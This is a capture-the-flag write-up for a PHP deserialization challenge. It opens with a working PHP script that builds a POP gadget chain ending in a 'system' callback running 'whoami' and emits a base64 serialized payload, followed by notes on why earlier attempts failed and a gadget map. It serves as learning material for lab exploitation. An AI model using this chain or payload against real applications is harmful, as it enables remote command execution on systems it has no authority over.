# POP Restaraunt

```python
<?php

namespace Helpers {
    class ArrayHelpers extends \ArrayIterator {
        public $callback;
    }
}

namespace {
    class Pizza { public $size; }
    class Spaghetti { public $sauce; }
    class IceCream { public $flavors; }

    $ah = new Helpers\ArrayHelpers(["whoami"]);
    $ah->callback = "system"; 

    $ice = new IceCream();
    $ice->flavors = $ah;

    $spag = new Spaghetti();
    $spag->sauce = $ice;

    $pizza = new Pizza();
    $pizza->size = $spag;

    echo base64_encode(serialize($pizza));
}
```

Congratulations on capturing the flag! That was a complex chain to piece together. For your notes, here is a summary of the "sticking points" where the exploit was failing and why those technical details mattered.

---

## 1. The Namespace Trap

This is the most common reason deserialization exploits fail. In PHP, a class named `ArrayHelpers` is **not** the same as `Helpers\ArrayHelpers`.

- **The Struggle:** Your initial scripts declared the class in the global namespace.
- **The Reality:** The server code used `namespace Helpers`. When PHP deserialized your payload, it looked for a global `ArrayHelpers` class, couldn't find it, and created an `__PHP_Incomplete_Class` object instead. This "broken" object doesn't have the magic methods needed to continue the chain.

## 2. Language Construct vs. Function

- **The Struggle:** You tried using `echo` as the callback.
- **The Reality:** `call_user_func()` requires a valid **function**. In PHP, `echo`, `print`, `include`, and `eval` are *language constructs*, not functions. If you try to call them via `call_user_func`, PHP throws a silent error and the execution stops. This is why switching to `system()` or `passthru()` was the turning point.

## 3. The Iterator Hybrid Structure

- **The Struggle:** Trying to manually craft the serialized string for `ArrayHelpers`.
- **The Reality:** `ArrayIterator` (and anything extending it) is a "hybrid." It stores data in a special internal bucket, but it stores properties (like `$callback`) in a standard object bucket.
- **The Lesson:** Manually editing serialized strings is high-risk. Using a "Generator Script" that mirrors the target's class structure is the "gold standard" for professional exploit development because it handles the internal PHP logic for you.

## 4. Output Buffering and Redirects

- **The Struggle:** Thinking the exploit was "blind" because the page redirected to `index.php`.
- **The Reality:** The execution was happening, but the browser was following the `Location` header before you could see it.
- **The Fix:** Using `system()` often forces output to be sent immediately. Once output is sent, PHP cannot send the redirect header ("Headers already sent"), effectively "breaking" the redirect and revealing your data.

---

### The Final "Gadget Map"

For your documentation, here is the final path the logic took:

| **Component** | **Class** | **Trigger** | **Action** |
| --- | --- | --- | --- |
| **Entry Point** | `Pizza` | `__destruct()` | Accesses `$this->size->what` |
| **Property Bridge** | `Spaghetti` | `__get()` | Calls `$this->sauce` as a function |
| **Method Bridge** | `IceCream` | `__invoke()` | Starts a `foreach` loop on `$flavors` |
| **Argument Sink** | `ArrayHelpers` | `current()` | Executes `call_user_func($callback, $val)` |

[Diving into unserialize(): POP Chains](https://vickieli.medium.com/diving-into-unserialize-pop-chains-35bc1141b69a)